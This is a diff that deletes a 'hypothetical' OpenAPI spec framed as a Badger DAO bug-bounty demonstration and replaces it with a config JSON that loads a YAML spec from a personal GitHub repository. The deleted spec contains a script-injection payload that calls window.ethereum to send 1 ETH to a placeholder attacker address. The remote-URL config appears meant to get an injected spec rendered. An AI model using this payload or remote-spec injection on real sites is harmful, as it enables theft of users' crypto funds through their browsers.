@@ -1,45 +1,9 @@
-openapi: 2.0.0
-info:
-  title: Badger DAO Hypothetical API
-  version: 1.0.0
-  description: |
-    This is a hypothetical API specification for Badger DAO, designed to demonstrate a vulnerability
-    where YAML or HTML injection could affect smart contract interactions. The endpoint defined below
-    could be introduced via YAML injection into the API documentation or implementation, leading to
-    security issues exploitable through the Web3 interface.
-paths:
-  /setMessage:
-    post:
-      summary: Set a message stored on-chain and displayed in the Web3 interface
-      description: |
-        This endpoint allows anyone to set a message that is stored in a Badger DAO smart contract
-        and displayed in the Web3 interface without sanitization. By injecting HTML (e.g., malicious
-        JavaScript), an attacker could manipulate the user's browser to alter transaction parameters
-        or trick users into approving unauthorized fund transfers, leading to theft of user funds.
-        Since this impacts the Web3 smart contract interface, it falls within the Badger DAO bug
-        bounty scope on Immunefi, which includes loss of user funds as a critical impact.
-      requestBody:
-        required: true
-        content:
-          application/json:
-            schema:
-              type: object
-              properties:
-                message:
-                  type: string
-                  description: Message to be stored on-chain and displayed. Accepts unsanitized HTML/JavaScript.
-                  example: "<script>window.ethereum.send({method: 'eth_sendTransaction', params: [{to: '0xAttackerAddress', value: '1000000000000000000'}]})</script>"
-      responses:
-        '200':
-          description: Message set successfully
-          content:
-            application/json:
-              schema:
-                type: object
-                properties:
-                  status:
-                    type: string
-                    example: "success"
-                  message:
-                    type: string
-                    example: "Message stored on-chain"
+{
+    "url": "https://raw.githubusercontent.com/olive-brown/badger/refs/heads/main/badger.yaml",
+    "urls": [
+        {
+            "url": "https://raw.githubusercontent.com/olive-brown/badger/refs/heads/main/badger.yaml",
+            "name": "Foo"
+        }
+    ]
+}
